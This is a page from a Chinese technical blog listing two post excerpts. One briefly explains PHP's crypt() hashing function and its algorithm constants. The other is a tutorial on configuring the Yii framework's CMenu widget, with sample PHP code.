    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpg">
      <meta itemprop="name" content="Veitor">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veitor的技术博客">
      <meta itemprop="description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Veitor的技术博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/crypt-encryption-functions-in-PHP/" class="post-title-link" itemprop="url">了解PHP中crypt加密函数</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2014-05-10 08:33:05" itemprop="dateCreated datePublished" datetime="2014-05-10T08:33:05+08:00">2014-05-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-03 16:44:15" itemprop="dateModified" datetime="2025-12-03T16:44:15+08:00">2025-12-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>曾经在分析Yii框架的博客demo中看到使用了这个crypt函数，于是就大致的了解了一下。</p>
<p>crypt() 返回一个基于标准 UNIX DES 算法或系统上其他可用的替代算法的散列字符串，这是手册中写到的，可能有些同学不是很理解这句话，我的理解就是，crypt回返回不同类型的散列字符串，即使用了不同算法返回的。而具体使用哪个算法，还要看所以来的操作系统。 PHP中有几个常量，分别是CRYPT_STD_DES 、CRYPT_EXT_DES、CRYPT_MD5、CRYPT_BLOWFISH、CRYPT_SHA256、CRYPT_SHA512。 这些常量不是1就是0，也意味着其所对应的算法是否可用。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/crypt-encryption-functions-in-PHP/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/usage-of-zii-widgets-CMenu-in-Yii/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpg">
      <meta itemprop="name" content="Veitor">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veitor的技术博客">
      <meta itemprop="description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Veitor的技术博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/usage-of-zii-widgets-CMenu-in-Yii/" class="post-title-link" itemprop="url">Yii：zii.widgets.CMenu使用方法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2014-04-28 07:21:43" itemprop="dateCreated datePublished" datetime="2014-04-28T07:21:43+08:00">2014-04-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-03 16:44:15" itemprop="dateModified" datetime="2025-12-03T16:44:15+08:00">2025-12-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Yii框架中的一个生成菜单的小物件。 先上个示例代码：</p>
<?php
$this->widget('zii.widgets.CMenu',array(
    'activeCssClass'=>'当前热点元素的样式',
    'firstItemCssClass'=>'第一个元素的样式',
    'lastItemCssClass'=>'最后一个元素的样式',
    'encodeLable'=>'false',  //当值为false时，label标签中的html就会将样式显示出来.
    'htmlOptions'=>array('class'=>'默认样式'),
    'items'=>array(
        array('label'=>'网站概况', 'url'=>array('/admin'),'itemOptions'=>array('class'=>'li_status'),'active'=>$this->id=='admin'?true:false),
        array('label'=>'图片管理', 'url'=>array('/picture'),'template'=>'{menu}<span>this is additional infomation</span>','itemOptions'=>array('class'=>'li_picture'),'active'=>$this->id=='picture'?true:false, 'visible'=>true),
        array('label'=>'管理员管理', 'url'=>array('/manager'),'itemOptions'=>array('class'=>'li_manager'),'submenuOptions'=>array('class'=>'subclass'),'active'=>($this->id=='manager' && $this->action->id!='changepswd')?true:false, 'visible'=>false),
        array('label'=>'密码修改', 'url'=>array('/manager/changepswd'),'linkOptions'=>array('target'=>'\_blank'),'itemOptions'=>array('class'=>'li\_changepswd'),'items'=>array(array('label'=>'子栏目'))),'active'=>($this->id=='manager' && $this->action->id=='changepswd')?true:false, 'visible'=>true),
        array('label'=>'登陆', 'url'=>array('/site/login'),'itemOptions'=>array('class'=>'li_login'), 'visible'=>Yii::app()->user->isGuest),
        array('label'=>'退出 ('.Yii::app()->user->name.')', 'url'=>array('/site/logout'),'itemOptions'=>array('class'=>'li_login'), 'visible'=>!Yii::app()->user->isGuest)
    ),
));
?>

<p>在模板中使用上面的代码，最终会生成以<ul><li></li></ul>构成的菜单列表，针对item中的每一个数组，可以进行以下设置： **label:**菜单显示的文本，可以加html进行修饰，但要将encodeLabel参数值设为false **url:**链接地址，若是字符串，则是基于网站根地址的绝对路径，比如网站地址为veitor.net，字符串url设置为”article”，则最终生成的地址为veitor.net&#x2F;article，如果设置类型为数组，则效果与createUrl方法一样，比如网址还是veitor.net，设置的数组url为”array(detail&#x2F;article)”，则最终生成的地址为veitor.net&#x2F;?r&#x3D;detail&#x2F;article，控制器&#x2F;方法格式的 **visible:**可见，boolean值，当然可以用函数来取值，决定什么情况下隐藏 **active:**正在访问，boolean值，如果是true，会在相应li中加入active样式，上面代码用到$this-&gt;id是个很好用的方法 **items:**定义子目录，array，通过样式可定义收缩排列或者鼠标经过时显示子目录 **template:**模板，模板中用{menu}来代表替换内容，见上代码 <strong>linkOptions:</strong><a>的属性，可定义class,rel,target等属性，见上代码 <strong>itemOptions:</strong><li>的属性，可定义class等属性，见上代码 **submenuOptions:**子栏目的<ul>属性，<li>和<a>属性还是和上面一样分别对item设置 <strong>activeCssClass：</strong>当前选中菜单的css的Class名称 <strong>firstItemCssClass：</strong>第一个菜单按钮的Css的Class名称 <strong>lastItemCssClass：</strong>最后一个菜单按钮的Css的Class名称 当然可以分别为每个Item菜单元素添加指定的Class，即在对应的Item元素上增加itemOptions设置（看上面代码）   这些就是我用CMenu的一些见解，如果你有更好的方法可以一起交流。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/7/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/9/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">苏ICP备14016154号-1 </a>
  </div>
  <div class="copyright">
    &copy; 2019 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Veitor</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>
<!-- Giscus comment script with dynamic container insertion -->
<script>
  // 创建一个函数，用于动态插入giscus容器并加载脚本
  function loadGiscus() {
    // 查找.post元素
    const mainInner = document.querySelector('.post');
    
    if (mainInner) {
      // 创建.giscus容器元素
      const giscusContainer = document.createElement('div');
      giscusContainer.className = 'giscus';
      
      // 将容器插入到.post的最尾部
      mainInner.appendChild(giscusContainer);
      
      // 创建giscus脚本元素
      const giscusScript = document.createElement('script');
      giscusScript.src = 'https://giscus.app/client.js';
      giscusScript.setAttribute('data-repo', 'Veitor/veitor.github.io');
      giscusScript.setAttribute('data-repo-id', 'MDEwOlJlcG9zaXRvcnkyMjQxOTk3OTU=');
      giscusScript.setAttribute('data-category', 'Article Discussions');
      giscusScript.setAttribute('data-category-id', 'DIC_kwDODV0Ec84CpCCm');
      giscusScript.setAttribute('data-mapping', 'title');
      giscusScript.setAttribute('data-strict', '1');
      giscusScript.setAttribute('data-reactions-enabled', '1');
      giscusScript.setAttribute('data-emit-metadata', '0');
      giscusScript.setAttribute('data-input-position', 'top');
      giscusScript.setAttribute('data-theme', 'preferred_color_scheme');
      giscusScript.setAttribute('data-lang', 'zh-CN');
      giscusScript.setAttribute('data-loading', 'lazy');
      giscusScript.setAttribute('crossorigin', 'anonymous');
      
      // 将脚本添加到页面
      document.body.appendChild(giscusScript);
    } else {
      // 如果.post元素不存在，在页面加载完成后再次尝试
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', loadGiscus);
      } else {
        // 使用setTimeout延迟重试
        setTimeout(loadGiscus, 100);
      }
    }
  }
  
  // 在DOM内容加载完成后执行
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', loadGiscus);
  } else {
    // 如果DOM已经加载完成，直接执行
    loadGiscus();
  }
</script>
</body>
</html>
